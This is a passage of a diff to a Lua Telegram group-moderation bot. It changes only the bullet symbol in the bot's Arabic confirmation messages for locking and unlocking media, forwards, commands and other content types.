     if database:get('lang:gp:'..msg.chat_id_) then
          send(msg.chat_id_, msg.id_, 1, '_> file has been_ *Locked*', 1, 'md')
       else
-         send(msg.chat_id_, msg.id_, 1, '● - `تم` ✔️ `قفل الملفات `🔐\n\n● - `خاصية : المسح` ☑️', 1, 'md')
+         send(msg.chat_id_, msg.id_, 1, '• `تم` ✔️ `قفل الملفات `🔐\n\n• `خاصية : المسح` ☑️', 1, 'md')
       end
          database:set('bot:document:mute'..msg.chat_id_,true)
       else
     if database:get('lang:gp:'..msg.chat_id_) then
                   send(msg.chat_id_, msg.id_, 1, '_> file is already_ *Locked*', 1, 'md')
       else
-         send(msg.chat_id_, msg.id_, 1, '● - `بالفعل تم` ✔️ `قفل الملفات` 🔐\n\n● - `خاصية : المسح` ☑️', 1, 'md')
+         send(msg.chat_id_, msg.id_, 1, '• `بالفعل تم` ✔️ `قفل الملفات` 🔐\n\n• `خاصية : المسح` ☑️', 1, 'md')
       end
       end
       end
@@ -4966,14 +4669,14 @@ end
     if database:get('lang:gp:'..msg.chat_id_) then
          send(msg.chat_id_, msg.id_, 1, '_> file ban has been_ *Locked*', 1, 'md')
       else
-         send(msg.chat_id_, msg.id_, 1, '● - `تم` ✔️ `قفل الملفات `🔐\n\n● - `خاصية : الطرد` ☑️', 1, 'md')
+         send(msg.chat_id_, msg.id_, 1, '• `تم` ✔️ `قفل الملفات `🔐\n\n• `خاصية : الطرد` ☑️', 1, 'md')
       end
          database:set('bot:document:ban'..msg.chat_id_,true)
       else
     if database:get('lang:gp:'..msg.chat_id_) then
                   send(msg.chat_id_, msg.id_, 1, '_> file ban is already_ *Locked*', 1, 'md')
       else
-         send(msg.chat_id_, msg.id_, 1, '● - `بالفعل تم` ✔️ `قفل الملفات` 🔐\n\n● - `خاصية : الطرد` ☑️', 1, 'md')
+         send(msg.chat_id_, msg.id_, 1, '• `بالفعل تم` ✔️ `قفل الملفات` 🔐\n\n• `خاصية : الطرد` ☑️', 1, 'md')
       end
       end
       end
@@ -4982,14 +4685,14 @@ end
     if database:get('lang:gp:'..msg.chat_id_) then
          send(msg.chat_id_, msg.id_, 1, '_> file ban has been_ *Locked*', 1, 'md')
       else
-         send(msg.chat_id_, msg.id_, 1, '● - `تم` ✔️ `قفل الملفات `🔐\n\n● - `خاصية : التحذير` ☑️', 1, 'md')
+         send(msg.chat_id_, msg.id_, 1, '• `تم` ✔️ `قفل الملفات `🔐\n\n• `خاصية : التحذير` ☑️', 1, 'md')
       end
          database:set('bot:document:warn'..msg.chat_id_,true)
       else
     if database:get('lang:gp:'..msg.chat_id_) then
                   send(msg.chat_id_, msg.id_, 1, '_> file warn is already_ *Locked*', 1, 'md')
       else
-         send(msg.chat_id_, msg.id_, 1, '● - `بالفعل تم` ✔️ `قفل الملفات` 🔐\n\n● - `خاصية : التحذير` ☑️', 1, 'md')
+         send(msg.chat_id_, msg.id_, 1, '• `بالفعل تم` ✔️ `قفل الملفات` 🔐\n\n• `خاصية : التحذير` ☑️', 1, 'md')
       end
       end
   end
@@ -4999,14 +4702,14 @@ end
     if database:get('lang:gp:'..msg.chat_id_) then
          send(msg.chat_id_, msg.id_, 1, '_> markdown has been_ *Locked*', 1, 'md')
       else
-         send(msg.chat_id_, msg.id_, 1, '● - `تم` ✔️ `قفل الماركدون `🔐\n\n● - `خاصية : المسح` ☑️', 1, 'md')
+         send(msg.chat_id_, msg.id_, 1, '• `تم` ✔️ `قفل الماركدون `🔐\n\n• `خاصية : المسح` ☑️', 1, 'md')
       end
          database:set('bot:markdown:mute'..msg.chat_id_,true)
       else
     if database:get('lang:gp:'..msg.chat_id_) then
                   send(msg.chat_id_, msg.id_, 1, '_> markdown is already_ *Locked*', 1, 'md')
       else
-         send(msg.chat_id_, msg.id_, 1, '● - `بالفعل تم` ✔️ `قفل الماركدون` 🔐\n\n● - `خاصية : المسح` ☑️', 1, 'md')
+         send(msg.chat_id_, msg.id_, 1, '• `بالفعل تم` ✔️ `قفل الماركدون` 🔐\n\n• `خاصية : المسح` ☑️', 1, 'md')
       end
       end
       end
@@ -5015,14 +4718,14 @@ end
     if database:get('lang:gp:'..msg.chat_id_) then
          send(msg.chat_id_, msg.id_, 1, '_> markdown ban has been_ *Locked*', 1, 'md')
       else
-         send(msg.chat_id_, msg.id_, 1, '● - `تم` ✔️ `قفل الماركدون `🔐\n\n● - `خاصية : الطرد` ☑️', 1, 'md')
+         send(msg.chat_id_, msg.id_, 1, '• `تم` ✔️ `قفل الماركدون `🔐\n\n• `خاصية : الطرد` ☑️', 1, 'md')
       end
          database:set('bot:markdown:ban'..msg.chat_id_,true)
       else
     if database:get('lang:gp:'..msg.chat_id_) then
                   send(msg.chat_id_, msg.id_, 1, '_> markdown ban is already_ *Locked*', 1, 'md')
       else
-         send(msg.chat_id_, msg.id_, 1, '● - `بالفعل تم` ✔️ `قفل الماركدون` 🔐\n\n● - `خاصية : الطرد` ☑️', 1, 'md')
+         send(msg.chat_id_, msg.id_, 1, '• `بالفعل تم` ✔️ `قفل الماركدون` 🔐\n\n• `خاصية : الطرد` ☑️', 1, 'md')
       end
       end
       end
@@ -5031,14 +4734,14 @@ end
     if database:get('lang:gp:'..msg.chat_id_) then
          send(msg.chat_id_, msg.id_, 1, '_> markdown ban has been_ *Locked*', 1, 'md')
       else
-         send(msg.chat_id_, msg.id_, 1, '● - `تم` ✔️ `قفل الماركدون `🔐\n\n● - `خاصية : التحذير` ☑️', 1, 'md')
+         send(msg.chat_id_, msg.id_, 1, '• `تم` ✔️ `قفل الماركدون `🔐\n\n• `خاصية : التحذير` ☑️', 1, 'md')
       end
          database:set('bot:markdown:warn'..msg.chat_id_,true)
       else
     if database:get('lang:gp:'..msg.chat_id_) then
                   send(msg.chat_id_, msg.id_, 1, '_> markdown warn is already_ *Locked*', 1, 'md')
       else
-         send(msg.chat_id_, msg.id_, 1, '● - `بالفعل تم` ✔️ `قفل الماركدون` 🔐\n\n● - `خاصية : التحذير` ☑️', 1, 'md')
+         send(msg.chat_id_, msg.id_, 1, '• `بالفعل تم` ✔️ `قفل الماركدون` 🔐\n\n• `خاصية : التحذير` ☑️', 1, 'md')
       end
       end
     end
@@ -5048,14 +4751,14 @@ end
     if database:get('lang:gp:'..msg.chat_id_) then
          send(msg.chat_id_, msg.id_, 1, '_> tgservice has been_ *Locked*', 1, 'md')
       else
-         send(msg.chat_id_, msg.id_, 1, '● - `تم` ✔️ `قفل الاشعارات `🔐\n\n● - `خاصية : المسح` ☑️', 1, 'md')
+         send(msg.chat_id_, msg.id_, 1, '• `تم` ✔️ `قفل الاشعارات `🔐\n\n• `خاصية : المسح` ☑️', 1, 'md')
       end
          database:set('bot:tgservice:mute'..msg.chat_id_,true)
        else
     if database:get('lang:gp:'..msg.chat_id_) then
                   send(msg.chat_id_, msg.id_, 1, '_> tgservice is already_ *Locked*', 1, 'md')
       else
-         send(msg.chat_id_, msg.id_, 1, '● - `بالفعل تم` ✔️ `قفل الاشعارات` 🔐\n\n● - `خاصية : المسح` ☑️', 1, 'md')
+         send(msg.chat_id_, msg.id_, 1, '• `بالفعل تم` ✔️ `قفل الاشعارات` 🔐\n\n• `خاصية : المسح` ☑️', 1, 'md')
       end
       end
       end
@@ -5064,14 +4767,14 @@ end
     if database:get('lang:gp:'..msg.chat_id_) then
          send(msg.chat_id_, msg.id_, 1, '_> forward has been_ *Locked*', 1, 'md')
       else
-         send(msg.chat_id_, msg.id_, 1, '● - `تم` ✔️ `قفل التوجيه `🔐\n\n● - `خاصية : المسح` ☑️', 1, 'md')
+         send(msg.chat_id_, msg.id_, 1, '• `تم` ✔️ `قفل التوجيه `🔐\n\n• `خاصية : المسح` ☑️', 1, 'md')
       end
          database:set('bot:forward:mute'..msg.chat_id_,true)
       else
     if database:get('lang:gp:'..msg.chat_id_) then
                   send(msg.chat_id_, msg.id_, 1, '_> forward is already_ *Locked*', 1, 'md')
       else
-         send(msg.chat_id_, msg.id_, 1, '● - `بالفعل تم` ✔️ `قفل التوجيه` 🔐\n\n● - `خاصية : المسح` ☑️', 1, 'md')
+         send(msg.chat_id_, msg.id_, 1, '• `بالفعل تم` ✔️ `قفل التوجيه` 🔐\n\n• `خاصية : المسح` ☑️', 1, 'md')
       end
       end
       end
@@ -5080,14 +4783,14 @@ end
     if database:get('lang:gp:'..msg.chat_id_) then
          send(msg.chat_id_, msg.id_, 1, '_> forward ban has been_ *Locked*', 1, 'md')
       else
-         send(msg.chat_id_, msg.id_, 1, '● - `تم` ✔️ `قفل التوجيه `🔐\n\n● - `خاصية : الطرد` ☑️', 1, 'md')
+         send(msg.chat_id_, msg.id_, 1, '• `تم` ✔️ `قفل التوجيه `🔐\n\n• `خاصية : الطرد` ☑️', 1, 'md')
       end
          database:set('bot:forward:ban'..msg.chat_id_,true)
       else
     if database:get('lang:gp:'..msg.chat_id_) then
                   send(msg.chat_id_, msg.id_, 1, '_> forward ban is already_ *Locked*', 1, 'md')
       else
-         send(msg.chat_id_, msg.id_, 1, '● - `بالفعل تم` ✔️ `قفل التوجيه` 🔐\n\n● - `خاصية : الطرد` ☑️', 1, 'md')
+         send(msg.chat_id_, msg.id_, 1, '• `بالفعل تم` ✔️ `قفل التوجيه` 🔐\n\n• `خاصية : الطرد` ☑️', 1, 'md')
       end
       end
       end
@@ -5096,14 +4799,14 @@ end
     if database:get('lang:gp:'..msg.chat_id_) then
          send(msg.chat_id_, msg.id_, 1, '_> forward ban has been_ *Locked*', 1, 'md')
       else
-         send(msg.chat_id_, msg.id_, 1, '● - `تم` ✔️ `قفل التوجيه `🔐\n\n● - `خاصية : التحذير` ☑️', 1, 'md')
+         send(msg.chat_id_, msg.id_, 1, '• `تم` ✔️ `قفل التوجيه `🔐\n\n• `خاصية : التحذير` ☑️', 1, 'md')
       end
          database:set('bot:forward:warn'..msg.chat_id_,true)
       else
     if database:get('lang:gp:'..msg.chat_id_) then
                   send(msg.chat_id_, msg.id_, 1, '_> forward warn is already_ *Locked*', 1, 'md')
       else
-         send(msg.chat_id_, msg.id_, 1, '● - `بالفعل تم` ✔️ `قفل التوجيه` 🔐\n\n● - `خاصية : التحذير` ☑️', 1, 'md')
+         send(msg.chat_id_, msg.id_, 1, '• `بالفعل تم` ✔️ `قفل التوجيه` 🔐\n\n• `خاصية : التحذير` ☑️', 1, 'md')
       end
       end
       end
@@ -5112,14 +4815,14 @@ end
     if database:get('lang:gp:'..msg.chat_id_) then
          send(msg.chat_id_, msg.id_, 1, '_> cmd has been_ *Locked*', 1, 'md')
       else
-         send(msg.chat_id_, msg.id_, 1, '● - `تم` ✔️ `قفل الشارحه `🔐\n\n● - `خاصية : المسح` ☑️', 1, 'md')
+         send(msg.chat_id_, msg.id_, 1, '• `تم` ✔️ `قفل الشارحه `🔐\n\n• `خاصية : المسح` ☑️', 1, 'md')
       end
          database:set('bot:cmd:mute'..msg.chat_id_,true)
       else
     if database:get('lang:gp:'..msg.chat_id_) then
                   send(msg.chat_id_, msg.id_, 1, '_> cmd is already_ *Locked*', 1, 'md')
       else
-         send(msg.chat_id_, msg.id_, 1, '● - `بالفعل تم` ✔️ `قفل الشارحه` 🔐\n\n● - `خاصية : المسح` ☑️', 1, 'md')
+         send(msg.chat_id_, msg.id_, 1, '• `بالفعل تم` ✔️ `قفل الشارحه` 🔐\n\n• `خاصية : المسح` ☑️', 1, 'md')
       end
       end
       end
@@ -5128,14 +4831,14 @@ end
     if database:get('lang:gp:'..msg.chat_id_) then
          send(msg.chat_id_, msg.id_, 1, '_> cmd ban has been_ *Locked*', 1, 'md')
       else
-         send(msg.chat_id_, msg.id_, 1, '● - `تم` ✔️ `قفل الشارحه `🔐\n\n● - `خاصية : الطرد` ☑️', 1, 'md')
+         send(msg.chat_id_, msg.id_, 1, '• `تم` ✔️ `قفل الشارحه `🔐\n\n• `خاصية : الطرد` ☑️', 1, 'md')
       end
          database:set('bot:cmd:ban'..msg.chat_id_,true)
       else
     if database:get('lang:gp:'..msg.chat_id_) then
                   send(msg.chat_id_, msg.id_, 1, '_> cmd ban is already_ *Locked*', 1, 'md')
       else
-         send(msg.chat_id_, msg.id_, 1, '● - `بالفعل تم` ✔️ `قفل الشارحه` 🔐\n\n● - `خاصية : الطرد` ☑️', 1, 'md')
+         send(msg.chat_id_, msg.id_, 1, '• `بالفعل تم` ✔️ `قفل الشارحه` 🔐\n\n• `خاصية : الطرد` ☑️', 1, 'md')
       end
       end
       end
@@ -5144,14 +4847,14 @@ end
     if database:get('lang:gp:'..msg.chat_id_) then
          send(msg.chat_id_, msg.id_, 1, '_> cmd ban has been_ *Locked*', 1, 'md')
       else
-         send(msg.chat_id_, msg.id_, 1, '● - `تم` ✔️ `قفل الشارحه `🔐\n\n● - `خاصية : التحذير` ☑️', 1, 'md')
+         send(msg.chat_id_, msg.id_, 1, '• `تم` ✔️ `قفل الشارحه `🔐\n\n• `خاصية : التحذير` ☑️', 1, 'md')
       end
          database:set('bot:cmd:warn'..msg.chat_id_,true)
       else
     if database:get('lang:gp:'..msg.chat_id_) then
                   send(msg.chat_id_, msg.id_, 1, '_> cmd warn is already_ *Locked*', 1, 'md')
       else
-         send(msg.chat_id_, msg.id_, 1, '● - `بالفعل تم` ✔️ `قفل الشارحه` 🔐\n\n● - `خاصية : التحذير` ☑️', 1, 'md')
+         send(msg.chat_id_, msg.id_, 1, '• `بالفعل تم` ✔️ `قفل الشارحه` 🔐\n\n• `خاصية : التحذير` ☑️', 1, 'md')
       end
       end
       end
@@ -5165,14 +4868,14 @@ end
     if database:get('lang:gp:'..msg.chat_id_) then
          send(msg.chat_id_, msg.id_, 1, '_> mute all has been_ *unLocked*', 1, 'md')
       else
-         send(msg.chat_id_, msg.id_, 1, '● - `تم `✔️ `فتح كل الوسائط `🔓\n\n● - `خاصية : المسح `⚠️', 1, 'md')
+         send(msg.chat_id_, msg.id_, 1, '• `تم `✔️ `فتح كل الوسائط `🔓\n\n• `خاصية : المسح `⚠️', 1, 'md')
       end
          database:del('bot:muteall'..msg.chat_id_)
       else
     if database:get('lang:gp:'..msg.chat_id_) then
           send(msg.chat_id_, msg.id_, 1, '_> mute all is already_ *unLocked*', 1, 'md')
       else
-         send(msg.chat_id_, msg.id_, 1, '● - `بالفعل تم` ✔️ `فتح كــل الوسائط` 🔓\n\n● - `خاصية : المسح` ⚠️', 1, 'md')
+         send(msg.chat_id_, msg.id_, 1, '• `بالفعل تم` ✔️ `فتح كــل الوسائط` 🔓\n\n• `خاصية : المسح` ⚠️', 1, 'md')
       end
       end
       end
@@ -5181,14 +4884,14 @@ end
     if database:get('lang:gp:'..msg.chat_id_) then
          send(msg.chat_id_, msg.id_, 1, '_> mute all warn has been_ *unLocked*', 1, 'md')
       else
-         send(msg.chat_id_, msg.id_, 1, '● - `تم `✔️ `فتح كل الوسائط `🔓\n\n● - `خاصية : التحذير `⚠️', 1, 'md')
+         send(msg.chat_id_, msg.id_, 1, '• `تم `✔️ `فتح كل الوسائط `🔓\n\n• `خاصية : التحذير `⚠️', 1, 'md')
       end
          database:del('bot:muteallwarn'..msg.chat_id_)
       else
     if database:get('lang:gp:'..msg.chat_id_) then
                   send(msg.chat_id_, msg.id_, 1, '_> mute all warn is already_ *unLocked*', 1, 'md')
       else
-         send(msg.chat_id_, msg.id_, 1, '● - `بالفعل تم` ✔️ `فتح كل الوسائط` 🔓\n\n● - `خاصية : التحذير` ⚠️', 1, 'md')
+         send(msg.chat_id_, msg.id_, 1, '• `بالفعل تم` ✔️ `فتح كل الوسائط` 🔓\n\n• `خاصية : التحذير` ⚠️', 1, 'md')
       end
       end
       end
@@ -5197,14 +4900,14 @@ end
     if database:get('lang:gp:'..msg.chat_id_) then
          send(msg.chat_id_, msg.id_, 1, '_> mute all ban has been_ *unLocked*', 1, 'md')
       else
-         send(msg.chat_id_, msg.id_, 1, '● - `تم `✔️ `فتح كل الوسائط `🔓\n\n● - `خاصية : بالطرد `⚠️', 1, 'md')
+         send(msg.chat_id_, msg.id_, 1, '• `تم `✔️ `فتح كل الوسائط `🔓\n\n• `خاصية : بالطرد `⚠️', 1, 'md')
       end
          database:del('bot:muteallban'..msg.chat_id_)
       else
     if database:get('lang:gp:'..msg.chat_id_) then
                   send(msg.chat_id_, msg.id_, 1, '_> mute all ban is already_ *unLocked*', 1, 'md')
       else
-         send(msg.chat_id_, msg.id_, 1, '● - `بالفعل تم` ✔️ `فتح كل الوسائط` 🔓\n\n● - `خاصية : بالطرد` ⚠️', 1, 'md')
+         send(msg.chat_id_, msg.id_, 1, '• `بالفعل تم` ✔️ `فتح كل الوسائط` 🔓\n\n• `خاصية : بالطرد` ⚠️', 1, 'md')
       end
       end
       end
@@ -5213,14 +4916,14 @@ end
     if database:get('lang:gp:'..msg.chat_id_) then
          send(msg.chat_id_, msg.id_, 1, '_> Text has been_ *unLocked*', 1, 'md')
       else
-         send(msg.chat_id_, msg.id_, 1, '● - `تم `✔️ `فتح الدردشه `🔓\n\n● - `خاصية : المسح `⚠️', 1, 'md')
+         send(msg.chat_id_, msg.id_, 1, '• `تم `✔️ `فتح الدردشه `🔓\n\n• `خاصية : المسح `⚠️', 1, 'md')
       end
          database:del('bot:text:mute'..msg.chat_id_)
       else
     if database:get('lang:gp:'..msg.chat_id_) then
                   send(msg.chat_id_, msg.id_, 1, '_> Text is already_ *unLocked*', 1, 'md')
       else
-         send(msg.chat_id_, msg.id_, 1, '● - `بالفعل تم` ✔️ `فتح الدردشه` 🔓\n\n● - `خاصية : المسح` ⚠️', 1, 'md')
+         send(msg.chat_id_, msg.id_, 1, '• `بالفعل تم` ✔️ `فتح الدردشه` 🔓\n\n• `خاصية : المسح` ⚠️', 1, 'md')
       end
       end
       end
@@ -5229,14 +4932,14 @@ end
     if database:get('lang:gp:'..msg.chat_id_) then
          send(msg.chat_id_, msg.id_, 1, '_> Text ban has been_ *unLocked*', 1, 'md')
       else
-         send(msg.chat_id_, msg.id_, 1, '● - `تم `✔️ `فتح الدردشه `🔓\n\n● - `خاصية : الطرد `⚠️', 1, 'md')
+         send(msg.chat_id_, msg.id_, 1, '• `تم `✔️ `فتح الدردشه `🔓\n\n• `خاصية : الطرد `⚠️', 1, 'md')
       end
          database:del('bot:text:ban'..msg.chat_id_)
       else
     if database:get('lang:gp:'..msg.chat_id_) then
                   send(msg.chat_id_, msg.id_, 1, '_> Text ban is already_ *unLocked*', 1, 'md')
       else
-         send(msg.chat_id_, msg.id_, 1, '● - `بالفعل تم` ✔️ `فتح الدردشه` 🔓\n\n● - `خاصية : الطرد` ⚠️', 1, 'md')
+         send(msg.chat_id_, msg.id_, 1, '• `بالفعل تم` ✔️ `فتح الدردشه` 🔓\n\n• `خاصية : الطرد` ⚠️', 1, 'md')
       end
       end
       end
@@ -5245,14 +4948,14 @@ end
     if database:get('lang:gp:'..msg.chat_id_) then
          send(msg.chat_id_, msg.id_, 1, '_> Text ban has been_ *unLocked*', 1, 'md')
       else
-         send(msg.chat_id_, msg.id_, 1, '● - `تم `✔️ `فتح الدردشه `🔓\n\n● - `خاصية : التحذير `⚠️', 1, 'md')
+         send(msg.chat_id_, msg.id_, 1, '• `تم `✔️ `فتح الدردشه `🔓\n\n• `خاصية : التحذير `⚠️', 1, 'md')
       end
          database:del('bot:text:warn'..msg.chat_id_)
       else
     if database:get('lang:gp:'..msg.chat_id_) then
                   send(msg.chat_id_, msg.id_, 1, '_> Text warn is already_ *unLocked*', 1, 'md')
       else
-         send(msg.chat_id_, msg.id_, 1, '● - `بالفعل تم` ✔️ `فتح الدردشه` 🔓\n\n● - `خاصية : التحذير` ⚠️', 1, 'md')
+         send(msg.chat_id_, msg.id_, 1, '• `بالفعل تم` ✔️ `فتح الدردشه` 🔓\n\n• `خاصية : التحذير` ⚠️', 1, 'md')
       end
       end
       end
@@ -5261,14 +4964,14 @@ end
     if database:get('lang:gp:'..msg.chat_id_) then
          send(msg.chat_id_, msg.id_, 1, '_> inline has been_ *unLocked*', 1, 'md')
       else
-         send(msg.chat_id_, msg.id_, 1, '● - `تم `✔️ `فتح الانلاين `🔓\n\n● - `خاصية : المسح `⚠️', 1, 'md')
+         send(msg.chat_id_, msg.id_, 1, '• `تم `✔️ `فتح الانلاين `🔓\n\n• `خاصية : المسح `⚠️', 1, 'md')
       end
          database:del('bot:inline:mute'..msg.chat_id_)
       else
     if database:get('lang:gp:'..msg.chat_id_) then
                   send(msg.chat_id_, msg.id_, 1, '_> inline is already_ *unLocked*', 1, 'md')
       else
-         send(msg.chat_id_, msg.id_, 1, '● - `بالفعل تم` ✔️ `فتح الانلاين` 🔓\n\n● - `خاصية : المسح` ⚠️', 1, 'md')
+         send(msg.chat_id_, msg.id_, 1, '• `بالفعل تم` ✔️ `فتح الانلاين` 🔓\n\n• `خاصية : المسح` ⚠️', 1, 'md')
       end
       end
       end
@@ -5277,14 +4980,14 @@ end
     if database:get('lang:gp:'..msg.chat_id_) then
          send(msg.chat_id_, msg.id_, 1, '_> inline ban has been_ *unLocked*', 1, 'md')
       else
-         send(msg.chat_id_, msg.id_, 1, '● - `تم `✔️ `فتح الانلاين `🔓\n\n● - `خاصية : الطرد `⚠️', 1, 'md')
+         send(msg.chat_id_, msg.id_, 1, '• `تم `✔️ `فتح الانلاين `🔓\n\n• `خاصية : الطرد `⚠️', 1, 'md')
       end
          database:del('bot:inline:ban'..msg.chat_id_)
       else
     if database:get('lang:gp:'..msg.chat_id_) then
                   send(msg.chat_id_, msg.id_, 1, '_> inline ban is already_ *unLocked*', 1, 'md')
       else
-         send(msg.chat_id_, msg.id_, 1, '● - `بالفعل تم` ✔️ `فتح الانلاين` 🔓\n\n● - `خاصية : الطرد` ⚠️', 1, 'md')
+         send(msg.chat_id_, msg.id_, 1, '• `بالفعل تم` ✔️ `فتح الانلاين` 🔓\n\n• `خاصية : الطرد` ⚠️', 1, 'md')
       end
       end
       end
@@ -5293,14 +4996,14 @@ end
     if database:get('lang:gp:'..msg.chat_id_) then
          send(msg.chat_id_, msg.id_, 1, '_> inline ban has been_ *unLocked*', 1, 'md')
       else
-         send(msg.chat_id_, msg.id_, 1, '● - `تم `✔️ `فتح الانلاين `🔓\n\n● - `خاصية : التحذير `⚠️', 1, 'md')
+         send(msg.chat_id_, msg.id_, 1, '• `تم `✔️ `فتح الانلاين `🔓\n\n• `خاصية : التحذير `⚠️', 1, 'md')
       end
          database:del('bot:inline:warn'..msg.chat_id_)
       else
     if database:get('lang:gp:'..msg.chat_id_) then
                   send(msg.chat_id_, msg.id_, 1, '_> inline warn is already_ *unLocked*', 1, 'md')
       else
-         send(msg.chat_id_, msg.id_, 1, '● - `بالفعل تم` ✔️ `فتح الانلاين` 🔓\n\n● - `خاصية : التحذير` ⚠️', 1, 'md')
+         send(msg.chat_id_, msg.id_, 1, '• `بالفعل تم` ✔️ `فتح الانلاين` 🔓\n\n• `خاصية : التحذير` ⚠️', 1, 'md')
       end
       end
       end
@@ -5309,14 +5012,14 @@ end
     if database:get('lang:gp:'..msg.chat_id_) then
          send(msg.chat_id_, msg.id_, 1, '_> photo has been_ *unLocked*', 1, 'md')
       else
-         send(msg.chat_id_, msg.id_, 1, '● - `تم `✔️ `فتح الصور `🔓\n\n● - `خاصية : المسح `⚠️', 1, 'md')
+         send(msg.chat_id_, msg.id_, 1, '• `تم `✔️ `فتح الصور `🔓\n\n• `خاصية : المسح `⚠️', 1, 'md')
       end
          database:del('bot:photo:mute'..msg.chat_id_)
       else
     if database:get('lang:gp:'..msg.chat_id_) then
                   send(msg.chat_id_, msg.id_, 1, '_> photo is already_ *unLocked*', 1, 'md')
       else
-         send(msg.chat_id_, msg.id_, 1, '● - `بالفعل تم` ✔️ `فتح الصور` 🔓\n\n● - `خاصية : المسح` ⚠️', 1, 'md')
+         send(msg.chat_id_, msg.id_, 1, '• `بالفعل تم` ✔️ `فتح الصور` 🔓\n\n• `خاصية : المسح` ⚠️', 1, 'md')
       end
       end
       end
@@ -5325,14 +5028,14 @@ end
     if database:get('lang:gp:'..msg.chat_id_) then
          send(msg.chat_id_, msg.id_, 1, '_> photo ban has been_ *unLocked*', 1, 'md')
       else
-         send(msg.chat_id_, msg.id_, 1, '● - `تم `✔️ `فتح الصور `🔓\n\n● - `خاصية : الطرد `⚠️', 1, 'md')
+         send(msg.chat_id_, msg.id_, 1, '• `تم `✔️ `فتح الصور `🔓\n\n• `خاصية : الطرد `⚠️', 1, 'md')
       end
          database:del('bot:photo:ban'..msg.chat_id_)
       else
     if database:get('lang:gp:'..msg.chat_id_) then
                   send(msg.chat_id_, msg.id_, 1, '_> photo ban is already_ *unLocked*', 1, 'md')
       else
-         send(msg.chat_id_, msg.id_, 1, '● - `بالفعل تم` ✔️ `فتح الصور` 🔓\n\n● - `خاصية : الطرد` ⚠️', 1, 'md')
+         send(msg.chat_id_, msg.id_, 1, '• `بالفعل تم` ✔️ `فتح الصور` 🔓\n\n• `خاصية : الطرد` ⚠️', 1, 'md')
       end
       end
       end
@@ -5341,14 +5044,14 @@ end
     if database:get('lang:gp:'..msg.chat_id_) then
          send(msg.chat_id_, msg.id_, 1, '_> photo ban has been_ *unLocked*', 1, 'md')
       else
-         send(msg.chat_id_, msg.id_, 1, '● - `تم `✔️ `فتح الصور `🔓\n\n● - `خاصية : التحذير `⚠️', 1, 'md')
+         send(msg.chat_id_, msg.id_, 1, '• `تم `✔️ `فتح الصور `🔓\n\n• `خاصية : التحذير `⚠️', 1, 'md')
       end
          database:del('bot:photo:warn'..msg.chat_id_)
       else
     if database:get('lang:gp:'..msg.chat_id_) then
                   send(msg.chat_id_, msg.id_, 1, '_> photo warn is already_ *unLocked*', 1, 'md')
       else
-         send(msg.chat_id_, msg.id_, 1, '● - `بالفعل تم` ✔️ `فتح الصور` 🔓\n\n● - `خاصية : التحذير` ⚠️', 1, 'md')
+         send(msg.chat_id_, msg.id_, 1, '• `بالفعل تم` ✔️ `فتح الصور` 🔓\n\n• `خاصية : التحذير` ⚠️', 1, 'md')
       end
       end
       end
@@ -5357,14 +5060,14 @@ end
     if database:get('lang:gp:'..msg.chat_id_) then
          send(msg.chat_id_, msg.id_, 1, '_> video has been_ *unLocked*', 1, 'md')
       else
-         send(msg.chat_id_, msg.id_, 1, '● - `تم `✔️ `فتح الفيديوهات `🔓\n\n● - `خاصية : المسح `⚠️', 1, 'md')
+         send(msg.chat_id_, msg.id_, 1, '• `تم `✔️ `فتح الفيديوهات `🔓\n\n• `خاصية : المسح `⚠️', 1, 'md')
       end
          database:del('bot:video:mute'..msg.chat_id_)
       else
     if database:get('lang:gp:'..msg.chat_id_) then
                   send(msg.chat_id_, msg.id_, 1, '_> video is already_ *unLocked*', 1, 'md')
       else
-         send(msg.chat_id_, msg.id_, 1, '● - `بالفعل تم` ✔️ `فتح الفيديوهات` 🔓\n\n● - `خاصية : المسح` ⚠️', 1, 'md')
+         send(msg.chat_id_, msg.id_, 1, '• `بالفعل تم` ✔️ `فتح الفيديوهات` 🔓\n\n• `خاصية : المسح` ⚠️', 1, 'md')
       end
       end
       end
@@ -5373,14 +5076,14 @@ end
     if database:get('lang:gp:'..msg.chat_id_) then
          send(msg.chat_id_, msg.id_, 1, '_> video ban has been_ *unLocked*', 1, 'md')
       else
-         send(msg.chat_id_, msg.id_, 1, '● - `تم `✔️ `فتح الفيديوهات `🔓\n\n● - `خاصية : بالطرد `⚠️', 1, 'md')
+         send(msg.chat_id_, msg.id_, 1, '• `تم `✔️ `فتح الفيديوهات `🔓\n\n• `خاصية : بالطرد `⚠️', 1, 'md')
       end
          database:del('bot:video:ban'..msg.chat_id_)
       else
     if database:get('lang:gp:'..msg.chat_id_) then
                   send(msg.chat_id_, msg.id_, 1, '_> video ban is already_ *unLocked*', 1, 'md')
       else
-         send(msg.chat_id_, msg.id_, 1, '● - `بالفعل تم` ✔️ `فتح الفيديوهات` 🔓\n\n● - `خاصية : بالطرد` ⚠️', 1, 'md')
+         send(msg.chat_id_, msg.id_, 1, '• `بالفعل تم` ✔️ `فتح الفيديوهات` 🔓\n\n• `خاصية : بالطرد` ⚠️', 1, 'md')
       end
       end
       end
@@ -5389,14 +5092,14 @@ end
     if database:get('lang:gp:'..msg.chat_id_) then
          send(msg.chat_id_, msg.id_, 1, '_> video ban has been_ *unLocked*', 1, 'md')
       else
-         send(msg.chat_id_, msg.id_, 1, '● - `تم `✔️ `فتح الفيديوهات `🔓\n\n● - `خاصية : التحذير `⚠️', 1, 'md')
+         send(msg.chat_id_, msg.id_, 1, '• `تم `✔️ `فتح الفيديوهات `🔓\n\n• `خاصية : التحذير `⚠️', 1, 'md')
       end
          database:del('bot:video:warn'..msg.chat_id_)
       else
     if database:get('lang:gp:'..msg.chat_id_) then
                   send(msg.chat_id_, msg.id_, 1, '_> video warn is already_ *unLocked*', 1, 'md')
       else
-         send(msg.chat_id_, msg.id_, 1, '● - `بالفعل تم` ✔️ `فتح الفيديوهات` 🔓\n\n● - `خاصية : التحذير` ⚠️', 1, 'md')
+         send(msg.chat_id_, msg.id_, 1, '• `بالفعل تم` ✔️ `فتح الفيديوهات` 🔓\n\n• `خاصية : التحذير` ⚠️', 1, 'md')
       end
       end
       end
@@ -5405,14 +5108,14 @@ end
     if database:get('lang:gp:'..msg.chat_id_) then
          send(msg.chat_id_, msg.id_, 1, '_> gifs has been_ *unLocked*', 1, 'md')
       else
-         send(msg.chat_id_, msg.id_, 1, '● - `تم `✔️ `فتح المتحركه `🔓\n\n● - `خاصية : المسح `⚠️', 1, 'md')
+         send(msg.chat_id_, msg.id_, 1, '• `تم `✔️ `فتح المتحركه `🔓\n\n• `خاصية : المسح `⚠️', 1, 'md')
       end
          database:del('bot:gifs:mute'..msg.chat_id_)
       else
     if database:get('lang:gp:'..msg.chat_id_) then
